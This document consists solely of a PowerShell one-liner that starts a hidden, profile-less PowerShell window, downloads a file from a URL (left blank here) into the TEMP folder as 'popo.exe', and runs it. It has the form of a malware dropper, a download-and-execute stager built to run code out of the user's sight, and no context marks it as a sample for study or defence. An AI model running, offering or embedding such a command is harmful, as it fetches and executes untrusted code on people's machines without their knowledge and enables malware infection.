powershell.exe -NoProfile -WindowStyle Hidden -Command "$url = ''; $out = Join-Path $env:TEMP 'popo.exe'; Invoke-WebRequest -Uri $url -OutFile $out; Start-Process -FilePath $out"
